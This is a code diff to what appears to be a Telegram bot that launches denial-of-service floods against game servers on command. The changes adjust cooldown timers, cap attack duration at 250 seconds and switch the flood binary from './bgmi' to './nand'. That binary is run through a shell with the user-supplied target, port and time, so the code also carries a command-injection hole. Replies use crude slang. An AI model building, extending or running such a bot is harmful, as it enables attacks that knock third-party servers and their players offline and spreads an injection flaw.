@@ -17,9 +17,9 @@ LOG_FILE = "log.txt"
 KEY_FILE = "keys.json"
 
 # Cooldown settings
-COOLDOWN_TIME = 0  # in seconds
+COOLDOWN_TIME = 10  # in seconds
 CONSECUTIVE_ATTACKS_LIMIT = 6
-CONSECUTIVE_ATTACKS_COOLDOWN = 0  # in seconds
+CONSECUTIVE_ATTACKS_COOLDOWN = 5  # in seconds
 
 # In-memory storage
 users = {}
@@ -183,13 +183,13 @@ def handle_bgmi(message):
             try:
                 port = int(command[2])
                 time = int(command[3])
-                if time > 300:
+                if time > 250:
                     response = "⚠️𝐄𝐑𝐑𝐎𝐑:240 𝐒𝐄 𝐓𝐇𝐎𝐃𝐀 𝐊𝐀𝐌 𝐓𝐈𝐌𝐄 𝐃𝐀𝐀𝐋 𝐆𝐀𝐍𝐃𝐔."
                 else: 
                     record_command_logs(user_id, '/bgmi', target, port, time)
                     log_command(user_id, target, port, time)
                     start_attack_reply(message, target, port, time)
-                    full_command = f"./bgmi {target} {port} {time}"
+                    full_command = f"./nand {target} {port} {time}"
                     subprocess.run(full_command, shell=True)
                     response = f"𝐂𝐇𝐔𝐃𝐀𝐈 𝐅𝐢𝐧𝐢𝐬𝐡𝐞𝐝🎮\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬"
             except ValueError:
